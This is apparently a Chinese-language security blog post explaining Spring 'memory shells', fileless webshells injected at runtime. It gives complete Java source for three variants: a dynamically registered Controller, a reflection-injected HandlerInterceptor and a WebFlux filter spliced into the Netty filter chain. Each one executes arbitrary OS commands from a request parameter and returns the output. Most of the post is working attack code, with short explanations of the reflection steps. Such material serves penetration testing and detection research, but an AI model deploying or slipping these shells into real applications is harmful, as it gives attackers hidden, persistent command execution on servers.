# Spring MVC框架型内存马

  
  
&lt;!--more--&gt;  
## Spring Controller型内存马  
编写Spring Controller型内存马步骤  
- 获取`WebApplicationContext`  
- 获取`RequestMappingHandlerMapping`实例  
- 通过反射获取自定义`Controller`的恶意方法的`Method`对象  
- 定义`RequestMappingInfo`  
- 动态注册`Controller`  
#### `SpringBoot &lt;= 2.6.0`  
```java  
package org.example.springdemox.Controller;    
    
import org.springframework.web.bind.annotation.RequestMapping;    
import org.springframework.web.bind.annotation.RestController;    
import org.springframework.web.context.WebApplicationContext;    
import org.springframework.web.context.request.RequestContextHolder;    
import org.springframework.web.context.request.ServletRequestAttributes;    
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;    
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;    
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;    
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;    
import javax.servlet.http.HttpServletRequest;    
import javax.servlet.http.HttpServletResponse;    
import java.io.InputStream;    
import java.lang.reflect.Method;    
import java.util.Scanner;    
    
@RestController    
public class TestController {    
    
    private String getRandomString() {    
        String characters = &#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#34;;    
        StringBuilder randomString = new StringBuilder();    
        for (int i = 0; i &lt; 8; i&#43;&#43;) {    
            int index = (int) (Math.random() * characters.length());    
            randomString.append(characters.charAt(index));    
        }    
        return randomString.toString();    
    }    
    
    @RequestMapping(&#34;/inject&#34;)    
    public String inject() throws Exception{    
        String controllerName = &#34;/&#34; &#43; getRandomString();    
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&#34;org.springframework.web.servlet.DispatcherServlet.CONTEXT&#34;, 0);    
        RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);    
        Method method = InjectedController.class.getMethod(&#34;cmd&#34;);    
        PatternsRequestCondition urlPattern = new PatternsRequestCondition(controllerName);    
        RequestMethodsRequestCondition condition = new RequestMethodsRequestCondition();    
        RequestMappingInfo info = new RequestMappingInfo(urlPattern, condition, null, null, null, null, null);    
        InjectedController injectedController = new InjectedController();    
        requestMappingHandlerMapping.registerMapping(info, injectedController, method);    
        return &#34;[&#43;] Inject successfully!&lt;br&gt;[&#43;] shell url: http://localhost:8080&#34; &#43; controllerName &#43; &#34;?cmd=ipconfig&#34;;    
    }    
    
    @RestController    
    public static class InjectedController {    
    
        public InjectedController(){    
        }    
    
        public void cmd() throws Exception {    
            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();    
            HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();    
            response.setCharacterEncoding(&#34;GBK&#34;);    
            if (request.getParameter(&#34;cmd&#34;) != null) {    
                boolean isLinux = true;    
                String osTyp = System.getProperty(&#34;os.name&#34;);    
                if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&#34;win&#34;)) {    
                    isLinux = false;    
                }    
                String[] cmds = isLinux ? new String[]{&#34;sh&#34;, &#34;-c&#34;, request.getParameter(&#34;cmd&#34;)} : new String[]{&#34;cmd.exe&#34;, &#34;/c&#34;, request.getParameter(&#34;cmd&#34;)};    
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();    
                Scanner s = new Scanner(in, &#34;GBK&#34;).useDelimiter(&#34;\\A&#34;);    
                String output = s.hasNext() ? s.next() : &#34;&#34;;    
                response.getWriter().write(output);    
                response.getWriter().flush();    
                response.getWriter().close();    
            }    
        }    
    }    
}  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502040016487.png)
#### `SpringBoot &gt;= 2.6.0`  
官方修改了url路径的默认匹配策略  
```java  
package org.example.springdemox.Controller;  
  
import org.springframework.web.bind.annotation.RequestMapping;  
import org.springframework.web.bind.annotation.RestController;  
import org.springframework.web.context.WebApplicationContext;  
import org.springframework.web.context.request.RequestContextHolder;  
import org.springframework.web.context.request.ServletRequestAttributes;  
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;  
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;  
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;  
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;  
import javax.servlet.http.HttpServletRequest;  
import javax.servlet.http.HttpServletResponse;  
import java.io.InputStream;  
import java.lang.reflect.Field;  
import java.lang.reflect.Method;  
import java.util.Scanner;  
  
@RestController  
public class TestController {  
  
    private String getRandomString() {  
        String characters = &#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#34;;  
        StringBuilder randomString = new StringBuilder();  
        for (int i = 0; i &lt; 8; i&#43;&#43;) {  
            int index = (int) (Math.random() * characters.length());  
            randomString.append(characters.charAt(index));  
        }  
        return randomString.toString();  
    }  
  
    @RequestMapping(&#34;/inject&#34;)  
    public String inject() throws Exception{  
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&#34;org.springframework.web.servlet.DispatcherServlet.CONTEXT&#34;, 0);  
        RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);  
        Field configField = requestMappingHandlerMapping.getClass().getDeclaredField(&#34;config&#34;);  
        configField.setAccessible(true);  
        RequestMappingInfo.BuilderConfiguration config = (RequestMappingInfo.BuilderConfiguration) configField.get(requestMappingHandlerMapping);  
        Method method = InjectedController.class.getMethod(&#34;cmd&#34;);  
        RequestMappingInfo info = RequestMappingInfo.paths(&#34;/shell&#34;).options(config).build();  
        InjectedController injectedController = new InjectedController();  
        requestMappingHandlerMapping.registerMapping(info, injectedController, method);  
        return &#34;[&#43;] Inject successfully!&lt;br&gt;[&#43;] shell url: http://localhost:8080/shell?cmd=whoami&#34;;  
    }  
  
    @RestController  
    public static class InjectedController {  
  
        public InjectedController(){  
        }  
  
        public void cmd() throws Exception {  
            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();  
            HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();  
            response.setCharacterEncoding(&#34;GBK&#34;);  
            if (request.getParameter(&#34;cmd&#34;) != null) {  
                boolean isLinux = true;  
                String osTyp = System.getProperty(&#34;os.name&#34;);  
                if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&#34;win&#34;)) {  
                    isLinux = false;  
                }  
                String[] cmds = isLinux ? new String[]{&#34;sh&#34;, &#34;-c&#34;, request.getParameter(&#34;cmd&#34;)} : new String[]{&#34;cmd.exe&#34;, &#34;/c&#34;, request.getParameter(&#34;cmd&#34;)};  
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();  
                Scanner s = new Scanner(in, &#34;GBK&#34;).useDelimiter(&#34;\\A&#34;);  
                String output = s.hasNext() ? s.next() : &#34;&#34;;  
                response.getWriter().write(output);  
                response.getWriter().flush();  
                response.getWriter().close();  
            }  
        }  
    }  
}  
```  
#### Spring Controller型内存马分析  
```java  
WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&#34;org.springframework.web.servlet.DispatcherServlet.CONTEXT&#34;, 0);  
RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);  
Method method = InjectedController.class.getMethod(&#34;cmd&#34;);  
PatternsRequestCondition urlPattern = new PatternsRequestCondition(controllerName);  
RequestMethodsRequestCondition condition = new RequestMethodsRequestCondition();  
RequestMappingInfo info = new RequestMappingInfo(urlPattern, condition, null, null, null, null, null);  
InjectedController injectedController = new InjectedController();  
requestMappingHandlerMapping.registerMapping(info, injectedController, method);  
```  
这段代码先利用`RequestContextHolder`获取当前请求的`WebApplicationContext`，这个`RequestContextHolder`是`Srping`框架提供的用于存储和访问请求相关信息的工厂类；接着从上一步中获取到的`WebApplicationContext`中获取`RequestMappingHandlerMapping Bean`;接着通过反射获得我们自定义的`Controller`的恶意方法的`Method`对象，然后就是拿到对应的`RequestMappingInfo`对象；通过`bean`实例&#43;处理请求的`method`&#43;对应的`RequestMappinginfo`对象即可调用`registerMapping`方法动态添加恶意`controller`。  
### Spring Interceptor型内存马  
- 获取`ApplicationContext`  
- 通过`AbstractHandlerMapping`反射来获取`adaptedInterceptors`  
- 将要注入的恶意拦截器放入到`adaptedInterceptors`中  
```java  
package org.example.springdemox.Controller;    
    
import org.springframework.stereotype.Controller;    
import org.springframework.web.bind.annotation.RequestMapping;    
import org.springframework.web.context.WebApplicationContext;    
import org.springframework.web.context.request.RequestContextHolder;    
import org.springframework.web.servlet.HandlerInterceptor;    
import org.springframework.web.servlet.ModelAndView;    
import org.springframework.web.servlet.handler.AbstractHandlerMapping;    
    
import javax.servlet.http.HttpServletRequest;    
import javax.servlet.http.HttpServletResponse;    
    
@Controller    
public class InterceptorShell {    
    @RequestMapping(&#34;/addinterceptor&#34;)    
    public void shell() throws Exception{    
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&#34;org.springframework.web.servlet.DispatcherServlet.CONTEXT&#34;,0);    
        AbstractHandlerMapping abstractHandlerMapping = (AbstractHandlerMapping) context.getBean(&#34;requestMappingHandlerMapping&#34;);    
        java.lang.reflect.Field field = AbstractHandlerMapping.class.getDeclaredField(&#34;adaptedInterceptors&#34;);    
        field.setAccessible(true);    
        java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;) field.get(abstractHandlerMapping);    
        testfilter testfilter = new testfilter();    
        adaptedInterceptors.add(testfilter);    
    }    
    public class testfilter implements HandlerInterceptor {    
        @Override    
        public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {    
            Runtime.getRuntime().exec(request.getParameter(&#34;cmd&#34;));    
            return true;    
        }    
    
        @Override    
        public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {    
            System.out.println(&#34;postHandler&#34;);    
        }    
    
        @Override    
        public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {    
            System.out.println(&#34;afterCompletion&#34;);    
        }    
    }    
}  
```  
  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502051900176.png)
  
### Spring WebFlux内存马  
```java  
import org.springframework.boot.web.embedded.netty.NettyWebServer;  
import org.springframework.context.annotation.Configuration;  
import org.springframework.core.io.buffer.DataBuffer;  
import org.springframework.core.io.buffer.DefaultDataBufferFactory;  
import org.springframework.http.MediaType;  
import org.springframework.http.server.reactive.ReactorHttpHandlerAdapter;  
import org.springframework.http.server.reactive.ServerHttpRequest;  
import org.springframework.http.server.reactive.ServerHttpResponse;  
import org.springframework.web.server.ServerWebExchange;  
import org.springframework.web.server.WebFilter;  
import org.springframework.web.server.WebFilterChain;  
import org.springframework.web.server.WebHandler;  
import org.springframework.web.server.adapter.HttpWebHandlerAdapter;  
import org.springframework.web.server.handler.DefaultWebFilterChain;  
import org.springframework.web.server.handler.ExceptionHandlingWebHandler;  
import org.springframework.web.server.handler.FilteringWebHandler;  
import reactor.core.publisher.Flux;  
import reactor.core.publisher.Mono;  
import java.io.BufferedReader;  
import java.io.IOException;  
import java.io.InputStreamReader;  
import java.lang.reflect.Array;  
import java.lang.reflect.Field;  
import java.lang.reflect.Method;  
import java.lang.reflect.Modifier;  
import java.nio.charset.StandardCharsets;  
import java.util.ArrayList;  
import java.util.List;  
  
@Configuration  
public class MemoryShellFilter implements WebFilter{  
  
    public static void doInject() {  
        Method getThreads;  
        try {  
            getThreads = Thread.class.getDeclaredMethod(&#34;getThreads&#34;);  
            getThreads.setAccessible(true);  
            Object threads = getThreads.invoke(null);  
            for (int i = 0; i &lt; Array.getLength(threads); i&#43;&#43;) {  
                Object thread = Array.get(threads, i);  
                if (thread != null &amp;&amp; thread.getClass().getName().contains(&#34;NettyWebServer&#34;)) {  
                    NettyWebServer nettyWebServer = (NettyWebServer) getFieldValue(thread, &#34;this$0&#34;, false);  
                    ReactorHttpHandlerAdapter reactorHttpHandlerAdapter = (ReactorHttpHandlerAdapter) getFieldValue(nettyWebServer, &#34;handler&#34;, false);  
                    Object delayedInitializationHttpHandler = getFieldValue(reactorHttpHandlerAdapter,&#34;httpHandler&#34;, false);  
                    HttpWebHandlerAdapter httpWebHandlerAdapter = (HttpWebHandlerAdapter) getFieldValue(delayedInitializationHttpHandler,&#34;delegate&#34;, false);  
                    ExceptionHandlingWebHandler exceptionHandlingWebHandler = (ExceptionHandlingWebHandler) getFieldValue(httpWebHandlerAdapter,&#34;delegate&#34;, true);  
                    FilteringWebHandler filteringWebHandler = (FilteringWebHandler) getFieldValue(exceptionHandlingWebHandler,&#34;delegate&#34;, true);  
                    DefaultWebFilterChain defaultWebFilterChain = (DefaultWebFilterChain) getFieldValue(filteringWebHandler,&#34;chain&#34;, false);  
                    Object handler = getFieldValue(defaultWebFilterChain, &#34;handler&#34;, false);  
                    List&lt;WebFilter&gt; newAllFilters = new ArrayList&lt;&gt;(defaultWebFilterChain.getFilters());  
                    newAllFilters.add(0, new MemoryShellFilter());  
                    DefaultWebFilterChain newChain = new DefaultWebFilterChain((WebHandler) handler, newAllFilters);  
                    Field f = filteringWebHandler.getClass().getDeclaredField(&#34;chain&#34;);  
                    f.setAccessible(true);  
                    Field modifersField = Field.class.getDeclaredField(&#34;modifiers&#34;);  
                    modifersField.setAccessible(true);  
                    modifersField.setInt(f, f.getModifiers() &amp; ~Modifier.FINAL);  
                    f.set(filteringWebHandler, newChain);  
                    modifersField.setInt(f, f.getModifiers() &amp; Modifier.FINAL);  
                }  
            }  
        } catch (Exception ignored) {}  
    }  
  
    public static Object getFieldValue(Object obj, String fieldName,boolean superClass) throws Exception {  
        Field f;  
        if(superClass){  
            f = obj.getClass().getSuperclass().getDeclaredField(fieldName);  
        }else {  
            f = obj.getClass().getDeclaredField(fieldName);  
        }  
        f.setAccessible(true);  
        return f.get(obj);  
    }  
  
    public Flux&lt;DataBuffer&gt; getPost(ServerWebExchange exchange) {  
        ServerHttpRequest request = exchange.getRequest();  
        String path = request.getURI().getPath();  
        String query = request.getURI().getQuery();  
  
        if (path.equals(&#34;/evil/cmd&#34;) &amp;&amp; query != null &amp;&amp; query.startsWith(&#34;command=&#34;)) {  
            String command = query.substring(8);  
            try {  
                Process process = Runtime.getRuntime().exec(&#34;cmd /c&#34; &#43; command);  
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream(), &#34;GBK&#34;));  
                Flux&lt;DataBuffer&gt; response = Flux.create(sink -&gt; {  
                    try {  
                        String line;  
                        while ((line = reader.readLine()) != null) {  
                            sink.next(DefaultDataBufferFactory.sharedInstance.wrap(line.getBytes(StandardCharsets.UTF_8)));  
                        }  
                        sink.complete();  
                    } catch (IOException ignored) {}  
                });  
  
                exchange.getResponse().getHeaders().setContentType(MediaType.TEXT_PLAIN);  
                return response;  
            } catch (IOException ignored) {}  
        }  
        return Flux.empty();  
    }  
  
    @Override  
    public Mono&lt;Void&gt; filter(ServerWebExchange exchange, WebFilterChain chain) {  
        if (exchange.getRequest().getURI().getPath().startsWith(&#34;/evil/&#34;)) {  
            doInject();  
            Flux&lt;DataBuffer&gt; response = getPost(exchange);  
            ServerHttpResponse serverHttpResponse = exchange.getResponse();  
            serverHttpResponse.getHeaders().setContentType(MediaType.TEXT_PLAIN);  
            return serverHttpResponse.writeWith(response);  
        } else {  
            return chain.filter(exchange);  
        }  
    }  
}  
```  
#### Spring WebFlux内存马分析  
通过反射找到`DefaultWebFilterChain`，然后拿到`filters`，把我们的`filter`插入到其中的第一位，再用那个`filters`重新调用公共构造函数`DefaultWebFilterChain`，赋值给`this.chain`  
先是通过反射来获取当前运行的所有线程组，然后遍历线程数组，检查每个线程是否为`NettyWebServer`实例。如果发现一个线程是`NettyWebServer`，那就继续下一步才做。接下来就是找`DefaultWebFilterChain`对象  
```java  
NettyWebServer nettyWebServer = (NettyWebServer) getFieldValue(thread, &#34;this$0&#34;, false);  
ReactorHttpHandlerAdapter reactorHttpHandlerAdapter = (ReactorHttpHandlerAdapter) getFieldValue(nettyWebServer, &#34;handler&#34;, false);  
Object delayedInitializationHttpHandler = getFieldValue(reactorHttpHandlerAdapter,&#34;httpHandler&#34;, false);  
HttpWebHandlerAdapter httpWebHandlerAdapter = (HttpWebHandlerAdapter) getFieldValue(delayedInitializationHttpHandler,&#34;delegate&#34;, false);  
ExceptionHandlingWebHandler exceptionHandlingWebHandler = (ExceptionHandlingWebHandler) getFieldValue(httpWebHandlerAdapter,&#34;delegate&#34;, true);  
FilteringWebHandler filteringWebHandler = (FilteringWebHandler) getFieldValue(exceptionHandlingWebHandler,&#34;delegate&#34;, true);  
DefaultWebFilterChain defaultWebFilterChain = (DefaultWebFilterChain) getFieldValue(filteringWebHandler,&#34;chain&#34;, false);  
```  
然后就是修改这个过滤器链，添加我们自定义的恶意filter，并把它放到第一位：  
```java  
Object handler = getFieldValue(defaultWebFilterChain, &#34;handler&#34;, false);  
List&lt;WebFilter&gt; newAllFilters = new ArrayList&lt;&gt;(defaultWebFilterChain.getFilters());  
newAllFilters.add(0, new MemoryShellFilter());  
DefaultWebFilterChain newChain = new DefaultWebFilterChain((WebHandler) handler, newAllFilters);  
```  
然后通过反射获取`FilteringWebHandler`的私有字段`chain`，设置为可访问之后，通过反射将原始的过滤器链替换为新创建的过滤器链`newChain`，然后恢复字段的可访问权限  
```java  
Field f = filteringWebHandler.getClass().getDeclaredField(&#34;chain&#34;);  
f.setAccessible(true);  
Field modifersField = Field.class.getDeclaredField(&#34;modifiers&#34;);  
modifersField.setAccessible(true);  
modifersField.setInt(f, f.getModifiers() &amp; ~Modifier.FINAL);  
f.set(filteringWebHandler, newChain);  
modifersField.setInt(f, f.getModifiers() &amp; Modifier.FINAL);  
```  
`modifersField.setInt(f, f.getModifiers() &amp; ~Modifier.FINAL);`和`modifersField.setInt(f, f.getModifiers() &amp; Modifier.FINAL);`的含义，第一个代码的意思就是使用反射机制，通过`modifersField`对象来修改字段的修饰符，`f.getModifiers()`返回字段`f`的当前修饰符，然后通过位运算`&amp;~Modifier.FINAL`，将当前修饰符的`FINAL`位清楚(置为0)，表示移除了`FINAL`修饰符；第二个则是把字段的修饰符重新设置为包含`FINAL`修饰符的修饰符，这样就可以保持字段的封装性。  
  

---

> Author: N1Rvana  
> URL: https://nlrvana.github.io/spring-mvc%E6%A1%86%E6%9E%B6%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/  

